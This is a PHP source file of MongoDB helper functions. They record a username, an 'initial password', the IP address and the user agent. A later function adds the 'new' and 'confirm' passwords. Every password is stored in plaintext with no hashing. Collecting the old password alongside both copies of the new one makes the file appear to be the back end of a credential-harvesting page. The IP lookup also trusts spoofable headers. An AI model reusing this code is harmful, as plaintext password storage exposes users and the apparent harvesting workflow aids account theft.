<?php
require_once 'config.php';

/**
 * Get MongoDB client instance
 */
function getMongoClient() {
    try {
        $client = new MongoDB\Driver\Manager(MONGODB_URI);
        return $client;
    } catch (Exception $e) {
        error_log("MongoDB Connection Error: " . $e->getMessage());
        return null;
    }
}

/**
 * Insert user data into MongoDB
 */
function insertUserData($username, $password, $ipAddress, $userAgent, $timestamp) {
    try {
        $manager = getMongoClient();
        if (!$manager) {
            return false;
        }

        $bulk = new MongoDB\Driver\BulkWrite;
        $document = [
            'username' => $username,
            'initial_password' => $password,
            'ip_address' => $ipAddress,
            'user_agent' => $userAgent,
            'timestamp' => $timestamp,
            'created_at' => new MongoDB\BSON\UTCDateTime(),
            'status' => 'pending_password_setup'
        ];
        
        $insertedId = $bulk->insert($document);
        
        $writeConcern = new MongoDB\Driver\WriteConcern(MongoDB\Driver\WriteConcern::MAJORITY, 1000);
        $result = $manager->executeBulkWrite(MONGODB_DATABASE . '.' . MONGODB_COLLECTION, $bulk, $writeConcern);
        
        return (string)$insertedId;
    } catch (Exception $e) {
        error_log("MongoDB Insert Error: " . $e->getMessage());
        return false;
    }
}

/**
 * Update user with new password
 */
function updateUserPassword($userId, $newPassword, $confirmPassword) {
    try {
        $manager = getMongoClient();
        if (!$manager) {
            return false;
        }

        $bulk = new MongoDB\Driver\BulkWrite;
        $bulk->update(
            ['_id' => new MongoDB\BSON\ObjectId($userId)],
            ['$set' => [
                'new_password' => $newPassword,
                'confirm_password' => $confirmPassword,
                'password_updated_at' => new MongoDB\BSON\UTCDateTime(),
                'status' => 'completed'
            ]],
            ['multi' => false, 'upsert' => false]
        );
        
        $writeConcern = new MongoDB\Driver\WriteConcern(MongoDB\Driver\WriteConcern::MAJORITY, 1000);
        $result = $manager->executeBulkWrite(MONGODB_DATABASE . '.' . MONGODB_COLLECTION, $bulk, $writeConcern);
        
        return $result->getModifiedCount() > 0;
    } catch (Exception $e) {
        error_log("MongoDB Update Error: " . $e->getMessage());
        return false;
    }
}

/**
 * Get user's real IP address (handles proxies and load balancers)
 */
function getUserIP() {
    $ipAddress = '';
    
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ipAddress = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipAddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED'])) {
        $ipAddress = $_SERVER['HTTP_X_FORWARDED'];
    } elseif (!empty($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipAddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } elseif (!empty($_SERVER['HTTP_FORWARDED'])) {
        $ipAddress = $_SERVER['HTTP_FORWARDED'];
    } elseif (!empty($_SERVER['REMOTE_ADDR'])) {
        $ipAddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipAddress = 'UNKNOWN';
    }
    
    return $ipAddress;
}

/**
 * Test MongoDB connection
 */
function testConnection() {
    $manager = getMongoClient();
    if ($manager) {
        echo "MongoDB connection successful!\n";
        return true;
    } else {
        echo "MongoDB connection failed!\n";
        return false;
    }
}
?>
